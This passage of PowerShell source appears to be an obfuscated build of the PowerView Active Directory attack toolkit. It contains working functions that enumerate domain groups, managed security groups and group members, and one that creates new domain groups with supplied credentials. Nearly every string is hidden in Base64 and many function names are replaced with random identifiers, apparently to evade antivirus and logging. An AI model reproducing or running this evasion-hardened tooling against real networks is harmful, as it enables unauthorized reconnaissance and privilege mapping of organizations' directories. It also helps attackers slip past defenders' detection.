                    Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBHAGUAdAAtAEQAbwBtAGEAaQBuAEcAcgBvAHUAcABdACAAUwBlAGEAcgBjAGgAaQBuAGcAIABmAG8AcgAgAGcAcgBvAHUAcAAgAHMAYwBvAHAAZQAgACcAJAB7ADUANQBiADIAYQBjADcAZQA3AGIAMQA5ADQANgA3AGUAOABmAGEANgBlADUANQAzADgAYQA5AGMAMQBhADIAOAB9ACcA')))
                }
                if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RwByAG8AdQBwAFAAcgBvAHAAZQByAHQAeQA=')))]) {
                    ${5af3851a534d4675a3d0a9608695ba3b} = $PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RwByAG8AdQBwAFAAcgBvAHAAZQByAHQAeQA=')))]
                    $Filter = Switch (${5af3851a534d4675a3d0a9608695ba3b}) {
                        $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGMAdQByAGkAdAB5AA==')))              { $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KABnAHIAbwB1AHAAVAB5AHAAZQA6ADEALgAyAC4AOAA0ADAALgAxADEAMwA1ADUANgAuADEALgA0AC4AOAAwADMAOgA9ADIAMQA0ADcANAA4ADMANgA0ADgAKQA='))) }
                        $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABpAHMAdAByAGkAYgB1AHQAaQBvAG4A')))          { $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KAAhACgAZwByAG8AdQBwAFQAeQBwAGUAOgAxAC4AMgAuADgANAAwAC4AMQAxADMANQA1ADYALgAxAC4ANAAuADgAMAAzADoAPQAyADEANAA3ADQAOAAzADYANAA4ACkAKQA='))) }
                        $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAYQB0AGUAZABCAHkAUwB5AHMAdABlAG0A')))       { $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KABnAHIAbwB1AHAAVAB5AHAAZQA6ADEALgAyAC4AOAA0ADAALgAxADEAMwA1ADUANgAuADEALgA0AC4AOAAwADMAOgA9ADEAKQA='))) }
                        $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgBvAHQAQwByAGUAYQB0AGUAZABCAHkAUwB5AHMAdABlAG0A')))    { $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KAAhACgAZwByAG8AdQBwAFQAeQBwAGUAOgAxAC4AMgAuADgANAAwAC4AMQAxADMANQA1ADYALgAxAC4ANAAuADgAMAAzADoAPQAxACkAKQA='))) }
                    }
                    Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBHAGUAdAAtAEQAbwBtAGEAaQBuAEcAcgBvAHUAcABdACAAUwBlAGEAcgBjAGgAaQBuAGcAIABmAG8AcgAgAGcAcgBvAHUAcAAgAHAAcgBvAHAAZQByAHQAeQAgACcAJAB7ADUAYQBmADMAOAA1ADEAYQA1ADMANABkADQANgA3ADUAYQAzAGQAMABhADkANgAwADgANgA5ADUAYgBhADMAYgB9ACcA')))
                }
                if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABEAEEAUABGAGkAbAB0AGUAcgA=')))]) {
                    Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBHAGUAdAAtAEQAbwBtAGEAaQBuAEcAcgBvAHUAcABdACAAVQBzAGkAbgBnACAAYQBkAGQAaQB0AGkAbwBuAGEAbAAgAEwARABBAFAAIABmAGkAbAB0AGUAcgA6ACAAJABMAEQAQQBQAEYAaQBsAHQAZQByAA==')))
                    $Filter += $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABMAEQAQQBQAEYAaQBsAHQAZQByAA==')))
                }
                ${6dfca86fd3264c2999a087404e239e9e}.filter = $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KAAmACgAbwBiAGoAZQBjAHQAQwBhAHQAZQBnAG8AcgB5AD0AZwByAG8AdQBwACkAJABGAGkAbAB0AGUAcgApAA==')))
                Write-Verbose "[Get-DomainGroup] filter string: $(${6dfca86fd3264c2999a087404e239e9e}.filter)"
                if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RgBpAG4AZABPAG4AZQA=')))]) { ${c1d2f3b775df48dfbe092797965c6f30} = ${6dfca86fd3264c2999a087404e239e9e}.FindOne() }
                else { ${c1d2f3b775df48dfbe092797965c6f30} = ${6dfca86fd3264c2999a087404e239e9e}.FindAll() }
                ${c1d2f3b775df48dfbe092797965c6f30} | Where-Object {$_} | ForEach-Object {
                    if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBhAHcA')))]) {
                        ${d9df5fc678774e82bffed7271d02d4ca} = $_
                    }
                    else {
                        ${d9df5fc678774e82bffed7271d02d4ca} = ac8c47b8977f4b0f9b4bbd3cb21b1a28 -Properties $_.Properties
                    }
                    ${d9df5fc678774e82bffed7271d02d4ca}.PSObject.TypeNames.Insert(0, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABvAHcAZQByAFYAaQBlAHcALgBHAHIAbwB1AHAA'))))
                    ${d9df5fc678774e82bffed7271d02d4ca}
                }
                if (${c1d2f3b775df48dfbe092797965c6f30}) {
                    try { ${c1d2f3b775df48dfbe092797965c6f30}.dispose() }
                    catch {
                        Write-Verbose $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBHAGUAdAAtAEQAbwBtAGEAaQBuAEcAcgBvAHUAcABdACAARQByAHIAbwByACAAZABpAHMAcABvAHMAaQBuAGcAIABvAGYAIAB0AGgAZQAgAFIAZQBzAHUAbAB0AHMAIABvAGIAagBlAGMAdAA=')))
                    }
                }
                ${6dfca86fd3264c2999a087404e239e9e}.dispose()
            }
        }
    }
}
function New-DomainGroup {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseShouldProcessForStateChangingFunctions', '')]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('DirectoryServices.AccountManagement.GroupPrincipal')]
    Param(
        [Parameter(Mandatory = $True)]
        [ValidateLength(0, 256)]
        [String]
        $SamAccountName,
        [ValidateNotNullOrEmpty()]
        [String]
        $Name,
        [ValidateNotNullOrEmpty()]
        [String]
        $DisplayName,
        [ValidateNotNullOrEmpty()]
        [String]
        $Description,
        [ValidateNotNullOrEmpty()]
        [String]
        $Domain,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )
    ${a13aaf2c161345c48ea81638d22fe192} = @{
        'Identity' = $SamAccountName
    }
    if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))]) { ${a13aaf2c161345c48ea81638d22fe192}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))] = $Domain }
    if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))]) { ${a13aaf2c161345c48ea81638d22fe192}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))] = $Credential }
    ${084af00cb6d64d1b8aedda7cb962e03c} = a1fcecd3120940898e2774ec72768c1d @a13aaf2c161345c48ea81638d22fe192
    if (${084af00cb6d64d1b8aedda7cb962e03c}) {
        ${d9df5fc678774e82bffed7271d02d4ca} = New-Object -TypeName System.DirectoryServices.AccountManagement.GroupPrincipal -ArgumentList (${084af00cb6d64d1b8aedda7cb962e03c}.Context)
        ${d9df5fc678774e82bffed7271d02d4ca}.SamAccountName = ${084af00cb6d64d1b8aedda7cb962e03c}.Identity
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgBhAG0AZQA=')))]) {
            ${d9df5fc678774e82bffed7271d02d4ca}.Name = $Name
        }
        else {
            ${d9df5fc678774e82bffed7271d02d4ca}.Name = ${084af00cb6d64d1b8aedda7cb962e03c}.Identity
        }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABpAHMAcABsAGEAeQBOAGEAbQBlAA==')))]) {
            ${d9df5fc678774e82bffed7271d02d4ca}.DisplayName = $DisplayName
        }
        else {
            ${d9df5fc678774e82bffed7271d02d4ca}.DisplayName = ${084af00cb6d64d1b8aedda7cb962e03c}.Identity
        }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABlAHMAYwByAGkAcAB0AGkAbwBuAA==')))]) {
            ${d9df5fc678774e82bffed7271d02d4ca}.Description = $Description
        }
        Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBOAGUAdwAtAEQAbwBtAGEAaQBuAEcAcgBvAHUAcABdACAAQQB0AHQAZQBtAHAAdABpAG4AZwAgAHQAbwAgAGMAcgBlAGEAdABlACAAZwByAG8AdQBwACAAJwAkAFMAYQBtAEEAYwBjAG8AdQBuAHQATgBhAG0AZQAnAA==')))
        try {
            $Null = ${d9df5fc678774e82bffed7271d02d4ca}.Save()
            Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBOAGUAdwAtAEQAbwBtAGEAaQBuAEcAcgBvAHUAcABdACAARwByAG8AdQBwACAAJwAkAFMAYQBtAEEAYwBjAG8AdQBuAHQATgBhAG0AZQAnACAAcwB1AGMAYwBlAHMAcwBmAHUAbABsAHkAIABjAHIAZQBhAHQAZQBkAA==')))
            ${d9df5fc678774e82bffed7271d02d4ca}
        }
        catch {
            Write-Warning $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBOAGUAdwAtAEQAbwBtAGEAaQBuAEcAcgBvAHUAcABdACAARQByAHIAbwByACAAYwByAGUAYQB0AGkAbgBnACAAZwByAG8AdQBwACAAJwAkAFMAYQBtAEEAYwBjAG8AdQBuAHQATgBhAG0AZQAnACAAOgAgACQAXwA=')))
        }
    }
}
function Get-DomainManagedSecurityGroup {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.ManagedSecurityGroup')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('Name')]
        [ValidateNotNullOrEmpty()]
        [String]
        $Domain,
        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        $SearchBase,
        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $Server,
        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $SearchScope = 'Subtree',
        [ValidateRange(1, 10000)]
        [Int]
        $ResultPageSize = 200,
        [ValidateRange(1, 10000)]
        [Int]
        $ServerTimeLimit,
        [Switch]
        $Tombstone,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )
    BEGIN {
        ${afd7d337a750465cb1eadfa1f8ae176d} = @{
            'LDAPFilter' = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KAAmACgAbQBhAG4AYQBnAGUAZABCAHkAPQAqACkAKABnAHIAbwB1AHAAVAB5AHAAZQA6ADEALgAyAC4AOAA0ADAALgAxADEAMwA1ADUANgAuADEALgA0AC4AOAAwADMAOgA9ADIAMQA0ADcANAA4ADMANgA0ADgAKQApAA==')))
            'Properties' = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZABpAHMAdABpAG4AZwB1AGkAcwBoAGUAZABOAGEAbQBlACwAbQBhAG4AYQBnAGUAZABCAHkALABzAGEAbQBhAGMAYwBvAHUAbgB0AHQAeQBwAGUALABzAGEAbQBhAGMAYwBvAHUAbgB0AG4AYQBtAGUA')))
        }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAQgBhAHMAZQA=')))]) { ${afd7d337a750465cb1eadfa1f8ae176d}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAQgBhAHMAZQA=')))] = $SearchBase }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIA')))]) { ${afd7d337a750465cb1eadfa1f8ae176d}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIA')))] = $Server }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAUwBjAG8AcABlAA==')))]) { ${afd7d337a750465cb1eadfa1f8ae176d}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAUwBjAG8AcABlAA==')))] = $SearchScope }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHMAdQBsAHQAUABhAGcAZQBTAGkAegBlAA==')))]) { ${afd7d337a750465cb1eadfa1f8ae176d}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHMAdQBsAHQAUABhAGcAZQBTAGkAegBlAA==')))] = $ResultPageSize }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIAVABpAG0AZQBMAGkAbQBpAHQA')))]) { ${afd7d337a750465cb1eadfa1f8ae176d}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIAVABpAG0AZQBMAGkAbQBpAHQA')))] = $ServerTimeLimit }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGMAdQByAGkAdAB5AE0AYQBzAGsAcwA=')))]) { ${afd7d337a750465cb1eadfa1f8ae176d}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGMAdQByAGkAdAB5AE0AYQBzAGsAcwA=')))] = $SecurityMasks }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABvAG0AYgBzAHQAbwBuAGUA')))]) { ${afd7d337a750465cb1eadfa1f8ae176d}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABvAG0AYgBzAHQAbwBuAGUA')))] = $Tombstone }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))]) { ${afd7d337a750465cb1eadfa1f8ae176d}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))] = $Credential }
    }
    PROCESS {
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))]) {
            ${afd7d337a750465cb1eadfa1f8ae176d}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))] = $Domain
            $TargetDomain = $Domain
        }
        else {
            $TargetDomain = $Env:USERDNSDOMAIN
        }
        d174ca9e2db1482aa71d60f71b8d2690 @afd7d337a750465cb1eadfa1f8ae176d | ForEach-Object {
            ${afd7d337a750465cb1eadfa1f8ae176d}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAByAG8AcABlAHIAdABpAGUAcwA=')))] = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZABpAHMAdABpAG4AZwB1AGkAcwBoAGUAZABuAGEAbQBlACwAbgBhAG0AZQAsAHMAYQBtAGEAYwBjAG8AdQBuAHQAdAB5AHAAZQAsAHMAYQBtAGEAYwBjAG8AdQBuAHQAbgBhAG0AZQAsAG8AYgBqAGUAYwB0AHMAaQBkAA==')))
            ${afd7d337a750465cb1eadfa1f8ae176d}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBkAGUAbgB0AGkAdAB5AA==')))] = $_.managedBy
            $Null = ${afd7d337a750465cb1eadfa1f8ae176d}.Remove($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABEAEEAUABGAGkAbAB0AGUAcgA='))))
            ${5b9effbeb2434d47a14e576e63e2727c} = dc2f41a670d5455b8f64f106e1b09449 @afd7d337a750465cb1eadfa1f8ae176d
            ${081a295e5e0b4b03b4f2708561748fcf} = New-Object PSObject
            ${081a295e5e0b4b03b4f2708561748fcf} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RwByAG8AdQBwAE4AYQBtAGUA'))) $_.samaccountname
            ${081a295e5e0b4b03b4f2708561748fcf} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RwByAG8AdQBwAEQAaQBzAHQAaQBuAGcAdQBpAHMAaABlAGQATgBhAG0AZQA='))) $_.distinguishedname
            ${081a295e5e0b4b03b4f2708561748fcf} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBhAG4AYQBnAGUAcgBOAGEAbQBlAA=='))) ${5b9effbeb2434d47a14e576e63e2727c}.samaccountname
            ${081a295e5e0b4b03b4f2708561748fcf} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBhAG4AYQBnAGUAcgBEAGkAcwB0AGkAbgBnAHUAaQBzAGgAZQBkAE4AYQBtAGUA'))) ${5b9effbeb2434d47a14e576e63e2727c}.distinguishedName
            if (${5b9effbeb2434d47a14e576e63e2727c}.samaccounttype -eq 0x10000000) {
                ${081a295e5e0b4b03b4f2708561748fcf} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBhAG4AYQBnAGUAcgBUAHkAcABlAA=='))) $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RwByAG8AdQBwAA==')))
            }
            elseif (${5b9effbeb2434d47a14e576e63e2727c}.samaccounttype -eq 0x30000000) {
                ${081a295e5e0b4b03b4f2708561748fcf} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBhAG4AYQBnAGUAcgBUAHkAcABlAA=='))) $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBzAGUAcgA=')))
            }
            ${916c7d6c5d224db9aaf93ec0ce059e19} = @{
                'Identity' = $_.distinguishedname
                'RightsFilter' = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VwByAGkAdABlAE0AZQBtAGIAZQByAHMA')))
            }
            if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIA')))]) { ${916c7d6c5d224db9aaf93ec0ce059e19}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIA')))] = $Server }
            if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAUwBjAG8AcABlAA==')))]) { ${916c7d6c5d224db9aaf93ec0ce059e19}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAUwBjAG8AcABlAA==')))] = $SearchScope }
            if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHMAdQBsAHQAUABhAGcAZQBTAGkAegBlAA==')))]) { ${916c7d6c5d224db9aaf93ec0ce059e19}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHMAdQBsAHQAUABhAGcAZQBTAGkAegBlAA==')))] = $ResultPageSize }
            if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIAVABpAG0AZQBMAGkAbQBpAHQA')))]) { ${916c7d6c5d224db9aaf93ec0ce059e19}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIAVABpAG0AZQBMAGkAbQBpAHQA')))] = $ServerTimeLimit }
            if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABvAG0AYgBzAHQAbwBuAGUA')))]) { ${916c7d6c5d224db9aaf93ec0ce059e19}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABvAG0AYgBzAHQAbwBuAGUA')))] = $Tombstone }
            if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))]) { ${916c7d6c5d224db9aaf93ec0ce059e19}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))] = $Credential }
            ${081a295e5e0b4b03b4f2708561748fcf} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBhAG4AYQBnAGUAcgBDAGEAbgBXAHIAaQB0AGUA'))) $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBOAEsATgBPAFcATgA=')))
            ${081a295e5e0b4b03b4f2708561748fcf}.PSObject.TypeNames.Insert(0, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABvAHcAZQByAFYAaQBlAHcALgBNAGEAbgBhAGcAZQBkAFMAZQBjAHUAcgBpAHQAeQBHAHIAbwB1AHAA'))))
            ${081a295e5e0b4b03b4f2708561748fcf}
        }
    }
}
function d5ea7ec938ad4aeeacb8bc5e972e183f {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseDeclaredVarsMoreThanAssignments', '')]
    [OutputType('PowerView.GroupMember')]
    [CmdletBinding(DefaultParameterSetName = 'None')]
    Param(
        [Parameter(Position = 0, Mandatory = $True, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('DistinguishedName', 'SamAccountName', 'Name', 'MemberDistinguishedName', 'MemberName')]
        [String[]]
        $Identity,
        [ValidateNotNullOrEmpty()]
        [String]
        $Domain,
        [Parameter(ParameterSetName = 'ManualRecurse')]
        [Switch]
        ${ae30d9d9023e4b5d9acb4a043f389cdd},
        [Parameter(ParameterSetName = 'RecurseUsingMatchingRule')]
        [Switch]
        ${a473963210e544d3a439a4718bdef971},
        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        $LDAPFilter,
        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        $SearchBase,
        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $Server,
        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $SearchScope = 'Subtree',
        [ValidateRange(1, 10000)]
        [Int]
        $ResultPageSize = 200,
        [ValidateRange(1, 10000)]
        [Int]
        $ServerTimeLimit,
        [ValidateSet('Dacl', 'Group', 'None', 'Owner', 'Sacl')]
        [String]
        $SecurityMasks,
        [Switch]
        $Tombstone,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )
    BEGIN {
        ${afd7d337a750465cb1eadfa1f8ae176d} = @{
            'Properties' = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bQBlAG0AYgBlAHIALABzAGEAbQBhAGMAYwBvAHUAbgB0AG4AYQBtAGUALABkAGkAcwB0AGkAbgBnAHUAaQBzAGgAZQBkAG4AYQBtAGUA')))
        }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))]) { ${afd7d337a750465cb1eadfa1f8ae176d}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))] = $Domain }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABEAEEAUABGAGkAbAB0AGUAcgA=')))]) { ${afd7d337a750465cb1eadfa1f8ae176d}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABEAEEAUABGAGkAbAB0AGUAcgA=')))] = $LDAPFilter }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAQgBhAHMAZQA=')))]) { ${afd7d337a750465cb1eadfa1f8ae176d}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAQgBhAHMAZQA=')))] = $SearchBase }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIA')))]) { ${afd7d337a750465cb1eadfa1f8ae176d}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIA')))] = $Server }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAUwBjAG8AcABlAA==')))]) { ${afd7d337a750465cb1eadfa1f8ae176d}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAUwBjAG8AcABlAA==')))] = $SearchScope }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHMAdQBsAHQAUABhAGcAZQBTAGkAegBlAA==')))]) { ${afd7d337a750465cb1eadfa1f8ae176d}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHMAdQBsAHQAUABhAGcAZQBTAGkAegBlAA==')))] = $ResultPageSize }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIAVABpAG0AZQBMAGkAbQBpAHQA')))]) { ${afd7d337a750465cb1eadfa1f8ae176d}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIAVABpAG0AZQBMAGkAbQBpAHQA')))] = $ServerTimeLimit }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABvAG0AYgBzAHQAbwBuAGUA')))]) { ${afd7d337a750465cb1eadfa1f8ae176d}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABvAG0AYgBzAHQAbwBuAGUA')))] = $Tombstone }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))]) { ${afd7d337a750465cb1eadfa1f8ae176d}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))] = $Credential }
        ${b36bf00903c14682a2e243a875596f28} = @{}
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))]) { ${b36bf00903c14682a2e243a875596f28}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))] = $Domain }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIA')))]) { ${b36bf00903c14682a2e243a875596f28}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIA')))] = $Server }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))]) { ${b36bf00903c14682a2e243a875596f28}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))] = $Credential }
    }
    PROCESS {
        ${6dfca86fd3264c2999a087404e239e9e} = d99af1f025294e4b8cf632a3987179c6 @afd7d337a750465cb1eadfa1f8ae176d
        if (${6dfca86fd3264c2999a087404e239e9e}) {
            if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAGMAdQByAHMAZQBVAHMAaQBuAGcATQBhAHQAYwBoAGkAbgBnAFIAdQBsAGUA')))]) {
                ${afd7d337a750465cb1eadfa1f8ae176d}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBkAGUAbgB0AGkAdAB5AA==')))] = $Identity
                ${afd7d337a750465cb1eadfa1f8ae176d}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBhAHcA')))] = $True
                ${d9df5fc678774e82bffed7271d02d4ca} = d174ca9e2db1482aa71d60f71b8d2690 @afd7d337a750465cb1eadfa1f8ae176d
                if (-not ${d9df5fc678774e82bffed7271d02d4ca}) {
                    Write-Warning $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBHAGUAdAAtAEQAbwBtAGEAaQBuAEcAcgBvAHUAcABNAGUAbQBiAGUAcgBdACAARQByAHIAbwByACAAcwBlAGEAcgBjAGgAaQBuAGcAIABmAG8AcgAgAGcAcgBvAHUAcAAgAHcAaQB0AGgAIABpAGQAZQBuAHQAaQB0AHkAOgAgACQASQBkAGUAbgB0AGkAdAB5AA==')))
                }
                else {
                    ${9fd551e465ec49029d638ba1be55331b} = ${d9df5fc678774e82bffed7271d02d4ca}.properties.item($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('cwBhAG0AYQBjAGMAbwB1AG4AdABuAGEAbQBlAA=='))))[0]
